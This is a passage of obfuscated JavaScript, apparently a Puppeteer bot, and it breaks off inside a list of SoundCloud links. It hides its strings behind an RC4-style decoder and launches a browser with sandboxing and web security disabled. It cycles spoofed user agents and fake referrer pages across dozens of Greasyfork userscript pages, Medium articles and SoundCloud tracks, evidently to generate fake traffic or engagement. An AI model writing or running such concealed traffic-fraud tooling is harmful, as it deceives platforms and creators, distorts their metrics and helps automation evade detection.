const a1 = c,
  a0 = d,
  Z = b;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1bfa + -0x48 * 0xd + 0x1fa2);
    let h = e[f];
    if (b['gMcIGz'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x93e + -0x1b07 + 0x1d * 0x9d, s, t, u = 0x9 * -0x15b + -0x283 * 0xc + 0x1 * 0x2a57; t = n['charAt'](u++); ~t && (s = r % (-0xd0e + -0xd9b + 0x1aad) ? s * (0x215f * -0x1 + -0x3b * -0xa7 + -0x4de) + t : t, r++ % (0x1a61 + 0x28b + -0xe74 * 0x2)) ? p += String['fromCharCode'](-0x21ca + 0x57 * 0x71 + -0x39e & s >> (-(-0x26bd + 0x1 * 0x1717 + 0xfa8) * r & -0x41 * -0x95 + 0x2096 + -0x4665)) : 0x14 * 0x71 + -0x2218 + 0x1944) {
          t = o['indexOf'](t);
        }
        for (let v = 0x230e + 0x1893 + 0xd7 * -0x47, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x12b7 + -0x1 * 0x85f + -0xa48))['slice'](-(0xf * -0x22 + -0x12 * 0x209 + 0x26a2));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x20b6 + -0x169 * 0x19 + 0x1 * 0x43f7,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x6 * 0x5ed + 0x2 * 0x114e + -0x462a; u < 0xad * -0x5 + 0x4e6 * -0x5 + 0x185 * 0x13; u++) {
          p[u] = u;
        }
        for (u = -0x22cf + 0x575 * 0x7 + -0x7 * 0x7c; u < 0x8 * -0x2e6 + -0x189 * -0xd + 0x43b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x43 * 0x3d + 0x8fa + 0x199 * 0x5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x199d + 0x2 * 0x260 + 0x14dd, q = 0x7 * 0x4f4 + -0xd2f + 0x1 * -0x157d;
        for (let v = -0x32 * -0x5 + 0x10 * -0x40 + -0x2 * -0x183; v < n['length']; v++) {
          u = (u + (0x28 * -0xcb + 0x286 + 0x1d33)) % (-0x11cb + -0x7f7 + 0x2ad * 0xa), q = (q + p[u]) % (-0x1415 * 0x1 + -0x3d * 0x5 + -0x2 * -0xb23), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x29a * -0xb + 0x21be + -0x420 * 0x1)]);
        }
        return t;
      };
      b['MPQQVJ'] = m, c = arguments, b['gMcIGz'] = !![];
    }
    const j = e[0x28a + -0x1c94 + 0x1a0a],
      k = f + j,
      l = c[k];
    return !l ? (b['UtuCnb'] === undefined && (b['UtuCnb'] = !![]), h = b['MPQQVJ'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0xcce + 0x3f2 + -0x10bf))) + h;
}
async function randomWait() {
  return await wait(-0x1575 + 0x1 * -0x24af + 0xc * 0x679 + (0x1 * -0x9ec + -0x263a + 0x43ae) * random()), 0x18a3 + -0x18d * 0x18 + 0x9 * 0x166;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_GF': 0x1,
    'RPL2_SC2': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x0,
    'RPL2_RPRT': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math,
  NETWORK_PATIENCE = -0x5c2d * 0x1 + 0xe * -0x6a4 + 0xe805 + (-0x41 * -0x95 + 0x2096 + -0x3ab3) * random(),
  MM_NETWORK_PATIENCE = (0x14 * 0x71 + -0x2218 + 0x1947) * NETWORK_PATIENCE,
  me = random()['toString'](0x230e + 0x1893 + 0x12b * -0x33)['substring'](0x12b7 + -0x1 * 0x85f + -0xa54, 0xf * -0x22 + -0x12 * 0x209 + 0x26aa),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + Z(0x5, '6!nt')
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0xc) + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a1(0x0) + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': Z(0x15, '%9$c') + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0x2) + 'e/moomoo.i' + 'o'
      },
      {
        'url': a1(0xa) + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + a0(0xe),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + Z(0xf, 'xm^l') + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Z(0x14, '1fcX') + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + a0(0x7) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + Z(0x11, '5#CJ') + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + a0(0xd) + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + Z(0x6, 'JO!6') + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + a0(0x4) + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
